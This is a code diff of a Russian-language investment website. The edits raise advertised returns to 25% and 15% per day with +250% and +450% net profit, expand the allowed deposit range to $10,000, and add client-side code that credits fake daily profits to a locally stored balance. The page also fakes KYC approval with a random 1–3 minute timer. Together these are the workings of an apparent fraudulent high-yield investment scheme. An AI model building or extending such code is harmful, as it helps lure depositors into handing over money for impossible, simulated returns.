@@ -443,7 +443,7 @@
                     <div class="plan-range">$100 – $499</div>
                     <ul class="plan-features">
                         <li>Срок депозита: <span>10 дней</span></li>
-                        <li>Начисления: <span>Ежедневно</span></li>
+                        <li>Начисления: <span>Ежедневно (25%/день)</span></li>
                         <li>Чистая прибыль: <span style="color: var(--accent);">+250%</span></li>
                     </ul>
                     <button class="btn" onclick="openModal('Pro', 100, 499)">Инвестировать</button>
@@ -451,13 +451,13 @@
 
                 <div class="plan-card">
                     <h3 class="plan-title">Master</h3>
-                    <div class="plan-range">$500 – $1,999</div>
+                    <div class="plan-range">$500 – $10,000</div>
                     <ul class="plan-features">
                         <li>Срок депозита: <span>30 дней</span></li>
-                        <li>Начисления: <span>Ежедневно</span></li>
+                        <li>Начисления: <span>Ежедневно (15%/день)</span></li>
                         <li>Чистая прибыль: <span style="color: var(--accent);">+450%</span></li>
                     </ul>
-                    <button class="btn" onclick="openModal('Master', 500, 1999)">Инвестировать</button>
+                    <button class="btn" onclick="openModal('Master', 500, 10000)">Инвестировать</button>
                 </div>
             </div>
         </div>
@@ -521,7 +521,7 @@
                 
                 <div class="amount-input-group">
                     <label for="investAmount">Сумма инвестиции ($):</label>
-                    <input type="number" id="investAmount" min="10" max="1999" oninput="validateAmount()">
+                    <input type="number" id="investAmount" min="10" max="10000" oninput="validateAmount()">
                 </div>
 
                 <div class="payment-methods">
@@ -608,6 +608,12 @@
         const SUPABASE_KEY = 'sb_publishable_sYHXSnwWJgT178wtP8MISA_t7A030f2';
         let supabaseClient = null;
 
+        const PLAN_CONFIGS = {
+            'Novice': { days: 1, totalProfitPct: 0.12, dailyPct: 0.12 },
+            'Pro': { days: 10, totalProfitPct: 2.50, dailyPct: 0.25 },
+            'Master': { days: 30, totalProfitPct: 4.50, dailyPct: 0.15 }
+        };
+
         try {
             if (window.supabase) {
                 supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
@@ -684,13 +690,36 @@
                 kyc: parsed.kyc || { status: 'none', docType: '', docNumber: '', fileData: '' }
             };
 
+            let now = Date.now();
+
             userData.transactions.forEach(tx => {
-                if ((tx.status === 'Выполнено' || tx.status === 'Выплачено') && !tx.payoutProcessed) {
-                    tx.payoutProcessed = true;
-                    let investAmount = tx.amount || 0;
-                    let profitAmount = investAmount * 0.12;
-                    userData.balance += (investAmount + profitAmount);
-                    userData.totalProfit += profitAmount;
+                if (tx.type === 'DEPOSIT') {
+                    let config = PLAN_CONFIGS[tx.plan] || { days: tx.totalDays || 1, dailyPct: tx.dailyPct || 0.12 };
+                    let totalDays = tx.totalDays || config.days;
+                    let dailyPct = tx.dailyPct || config.dailyPct;
+                    let daysPaid = tx.daysPaid || 0;
+                    let startDate = tx.startDate || (tx.targetTime ? (tx.targetTime - totalDays * 86400000) : (now - 86400000));
+
+                    if (!tx.payoutProcessed && tx.status !== 'Выполнено' && tx.status !== 'Выплачено') {
+                        let daysPassedTotal = Math.floor((now - startDate) / 86400000);
+                        let dueDays = Math.min(totalDays, daysPassedTotal) - daysPaid;
+
+                        if (dueDays > 0) {
+                            for (let d = 0; d < dueDays; d++) {
+                                let dailyProfit = tx.amount * dailyPct;
+                                userData.balance += dailyProfit;
+                                userData.totalProfit += dailyProfit;
+                                daysPaid++;
+                            }
+                            tx.daysPaid = daysPaid;
+                        }
+
+                        if (daysPaid >= totalDays) {
+                            userData.balance += tx.amount; // Возврат тела депозита
+                            tx.status = 'Выплачено';
+                            tx.payoutProcessed = true;
+                        }
+                    }
                 }
             });
 
@@ -807,7 +836,7 @@
                     
                     let timerHtml = '';
                     if (isDep && tx.targetTime && !tx.payoutProcessed && tx.status !== 'Выполнено' && tx.status !== 'Выплачено') {
-                        timerHtml = `<span class="tx-timer" data-target="${tx.targetTime}" data-index="${index}">--:--:--</span>`;
+                        timerHtml = `<span class="tx-timer" data-target="${tx.targetTime}" data-index="${index}">--</span>`;
                     }
 
                     row.innerHTML = `
@@ -862,7 +891,6 @@
 
             let userData = getCleanUserData(localStorage.getItem('user_data_' + email));
 
-            // Генерируем таймер проверки (от 60 до 180 секунд)
             let randomDelay = Math.floor(Math.random() * (180000 - 60000 + 1)) + 60000;
             let approveTime = Date.now() + randomDelay;
 
@@ -1326,16 +1354,23 @@
             userData.totalInvested += amount;
             userData.activeDeposits += 1;
             
-            let futureTime = Date.now() + (24 * 60 * 60 * 1000);
+            const config = PLAN_CONFIGS[currentPlan] || { days: 1, totalProfitPct: 0.12, dailyPct: 0.12 };
+            const now = Date.now();
+            const durationMs = config.days * 24 * 60 * 60 * 1000;
 
             userData.transactions.unshift({
                 type: 'DEPOSIT',
+                plan: currentPlan,
                 amount: amount,
                 method: currentMethodName,
                 details: currentMethodDetails,
                 date: new Date().toLocaleDateString(),
                 status: 'Активен',
-                targetTime: futureTime,
+                startDate: now,
+                targetTime: now + durationMs,
+                totalDays: config.days,
+                dailyPct: config.dailyPct,
+                daysPaid: 0,
                 payoutProcessed: false
             });
 
@@ -1379,7 +1414,7 @@
 
             let now = Date.now();
 
-            // Одобрение KYC строго через 1-3 минуты
+            // Одобрение KYC
             if (userData.kyc && userData.kyc.status === 'pending' && userData.kyc.approveAt) {
                 if (now >= userData.kyc.approveAt) {
                     userData.kyc.status = 'verified';
@@ -1393,48 +1428,34 @@
                 }
             }
 
-            // Таймеры депозитов
+            // Таймеры депозитов (без секунд)
             const timers = document.querySelectorAll('.tx-timer');
             timers.forEach(timerEl => {
                 let targetTime = parseInt(timerEl.getAttribute('data-target'));
-                let txIndex = parseInt(timerEl.getAttribute('data-index'));
                 let distance = targetTime - now;
 
                 if (distance <= 0) {
-                    if (userData.transactions[txIndex] && !userData.transactions[txIndex].payoutProcessed) {
-                        userData.transactions[txIndex].payoutProcessed = true;
-                        userData.transactions[txIndex].status = 'Выплачено';
-                        
-                        let investAmount = userData.transactions[txIndex].amount || 0;
-                        let profitAmount = investAmount * 0.12; 
-                        
-                        userData.balance += (investAmount + profitAmount);
-                        userData.totalProfit += profitAmount;
-                        
-                        localStorage.setItem('user_data_' + email, JSON.stringify(userData));
-                        saveToSupabase(email, userData);
-                        loadUserData(email);
-                    }
+                    loadUserData(email);
                 } else {
-                    let h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                    let m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                    let s = Math.floor((distance % (1000 * 60)) / 1000);
-                    
-                    timerEl.innerText = 
-                        String(h).padStart(2, '0') + ":" + 
-                        String(m).padStart(2, '0') + ":" + 
-                        String(s).padStart(2, '0');
+                    let totalHours = Math.floor(distance / (1000 * 60 * 60));
+                    let remainingDays = Math.floor(totalHours / 24);
+                    let remainingHours = totalHours % 24;
+
+                    if (remainingDays > 0) {
+                        timerEl.innerText = `${remainingDays} дн ${remainingHours} ч`;
+                    } else {
+                        let remainingMins = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                        timerEl.innerText = `${remainingHours} ч ${remainingMins} мин`;
+                    }
                 }
             });
         }, 1000);
     </script>
 <script>
-    // Отключаем встроенный авто-скролл браузера
     if ('scrollRestoration' in history) {
         history.scrollRestoration = 'manual';
     }
 
-    // Восстанавливаем позицию при загрузке страницы
     document.addEventListener("DOMContentLoaded", function() {
         let scrollPosition = sessionStorage.getItem("scrollPosition");
         if (scrollPosition !== null) {
@@ -1443,7 +1464,6 @@
         }
     });
 
-    // Сохраняем позицию перед перезагрузкой
     window.addEventListener("beforeunload", function() {
         sessionStorage.setItem("scrollPosition", window.scrollY);
     });
